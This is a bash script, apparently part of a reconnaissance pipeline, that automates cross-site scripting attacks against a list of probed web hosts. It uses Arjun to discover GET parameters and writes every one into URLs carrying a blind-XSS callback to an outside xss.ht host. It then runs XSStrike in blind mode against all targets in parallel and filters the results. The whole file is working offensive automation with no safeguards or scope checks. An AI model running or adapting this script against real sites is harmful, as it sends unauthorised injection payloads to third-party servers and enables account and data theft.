#!/bin/bash
cd /root/script/3_httprobe

input=httprobe.txt ; export input=httprobe.txt
i=1
echo '#!/bin/bash' >> /root/script/3_httprobe/exe.sh

num=1
for line in `cat $input`

do

mkdir /root/script/3_httprobe/dir_$i
echo '#!/bin/bash' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'input=httprobe.txt' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cd /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cp -r /root/script/3_httprobe/Arjun/* /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "python3 arjun.py -u \"$line\" -t 1 -d 0 -o 1.txt --get" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'grep -oP "param\"\:\ \".*" 1.txt | grep -oP "\ \".*\"" | sed -e "s/\"//g" | sed -e "s/\ //g" > 2.txt' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'for param in `cat 2.txt`; do line=`head -$num /root/script/3_httprobe/$input | tail -1` ; echo "${line}" > togrep.txt ; touch toif.txt ; grep -o "?" togrep.txt > toif.txt ; if [ -s toif.txt ]; then echo "${line}&${param}=https://xsshunternihao.xss.ht" >> /root/script/3_httprobe/params_xss_test.txt; else echo "${line}?${param}=https://xsshunternihao.xss.ht" >> /root/script/3_httprobe/params_xss_test.txt; fi; rm togrep.txt ; rm toif.txt ; num=$((num+1)) ; done' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "rm -rf /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "bash /root/script/3_httprobe/dir_$i/${i}.sh" >> /root/script/3_httprobe/exe.sh
i=$((i+1))

done
cat /root/script/3_httprobe/exe.sh | parallel --jobs 0 --delay 0.5 --retries 1
rm /root/script/3_httprobe/exe.sh

cd /root/script/3_httprobe

sort -u /root/script/3_httprobe/httprobe.txt -o /root/script/3_httprobe/httprobe.txt ; sort -u /root/script/3_httprobe/params_xss_test.txt -o /root/script/3_httprobe/params_xss_test.txt
grep ".json" /root/script/3_httprobe/httprobe.txt >> /root/script/3_httprobe/httprobe_json.txt
sed -e "s/.json/.html/g" /root/script/3_httprobe/httprobe_json.txt >> /root/script/3_httprobe/params_xss_test.txt ; rm /root/script/3_httprobe/httprobe_json.txt
cat /root/script/3_httprobe/params_xss_test.txt >> /root/script/3_httprobe/httprobe.txt ; sort -u /root/script/3_httprobe/httprobe.txt -o /root/script/3_httprobe/httprobe.txt ; rm /root/script/3_httprobe/params_xss_test.txt

ls ; wc -l $input ; du -h












#xsstrike

#创建目录
output=$output ; export output=$output

i=1
echo '#!/bin/bash' >> /root/script/3_httprobe/exe.sh

for line in `cat $input`
do

mkdir /root/script/3_httprobe/dir_$i

echo '#!/bin/bash' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'input=httprobe.txt' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cd /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "echo '$line' >> /root/script/3_httprobe/dir_${i}/${input}" >> /root/script/3_httprobe/dir_${i}/${i}.sh
echo "cp -r /root/script/3_httprobe/XSStrike/* /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "for c in "\`cat /root/script/3_httprobe/dir_$i/${input}\`"; do echo \"\$c\" >> \${output}/xss.txt ; echo '------- ------------ ------------ -------------' >> \${output}/xss.txt ; python3 xsstrike.py -u \"\$c\" --skip --blind >> \${output}/xss.txt ; echo ' ' >> \${output}/xss.txt;echo ' ' >> \${output}/xss.txt;echo ' ' >> \${output}/xss.txt;echo ' ' >> \${output}/xss.txt;echo ' ' >> \${output}/xss.txt ; grep -v \"XSStrike\" \${output}/xss.txt | grep -v \"WAF Status\" | grep -v \"No reflection\" | grep -v \"DOM\" | grep -v \"0m\" | grep -v \"91m\" | grep -v \"Testing parameter\" >> xss.txt ; mv xss.txt \${output}/xss.txt ; line=\`cat \${output}/xss.txt | wc -l\` ; if [ \$line -eq 7 ]; then > \${output}/xss.txt ; fi; cat \${output}/xss.txt >> \${output}/xsstrike.txt; done" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cd /root/script/3_httprobe; rm -r /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "bash /root/script/3_httprobe/dir_$i/${i}.sh" >> /root/script/3_httprobe/exe.sh
i=$((i+1))

done
cat /root/script/3_httprobe/exe.sh | parallel --jobs 0 --delay 0.5 --retries 1
rm /root/script/3_httprobe/exe.sh
rm dir_* -r

rm /root/script/3_httprobe/params_xss_test.txt
ls ; wc -l $output/xss.txt
